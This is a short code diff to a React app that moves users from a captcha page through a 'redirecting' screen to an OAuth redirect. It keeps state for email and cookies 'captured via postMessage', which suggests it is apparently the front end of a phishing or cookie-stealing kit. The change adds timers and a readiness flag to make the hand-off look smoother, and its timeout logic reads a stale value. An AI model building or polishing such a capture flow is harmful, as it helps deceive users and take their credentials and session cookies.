@@ -18,6 +18,7 @@ const totalCaptchaDelay = captchaVerificationDelay + messageIconDelay + nextStep
 
 function App() {
   const [currentPage, setCurrentPage] = useState('captcha');
+  const [isOAuthReady, setIsOAuthReady] = useState(false);
 
   // State to hold the most reliable email and cookies captured via postMessage
   const [capturedEmail, setCapturedEmailState] = useState<string | null>(null);
@@ -46,10 +47,26 @@ function App() {
   // Handle redirecting to OAuth after delay
   useEffect(() => {
     if (currentPage === 'redirecting') {
+      // Preload OAuth component to prevent white flash
+      setIsOAuthReady(true);
       const timer = setTimeout(() => {
-        setCurrentPage('oauth-redirect');
+        // Only transition when OAuth is ready
+        if (isOAuthReady) {
+          setCurrentPage('oauth-redirect');
+        }
       }, redirectingDelay);
       return () => clearTimeout(timer);
+    }
+  }, [currentPage, isOAuthReady]);
+
+  // Preload OAuth component when redirecting starts
+  useEffect(() => {
+    if (currentPage === 'redirecting') {
+      // Force component preload
+      const preloadTimer = setTimeout(() => {
+        setIsOAuthReady(true);
+      }, 100);
+      return () => clearTimeout(preloadTimer);
     }
   }, [currentPage]);
 
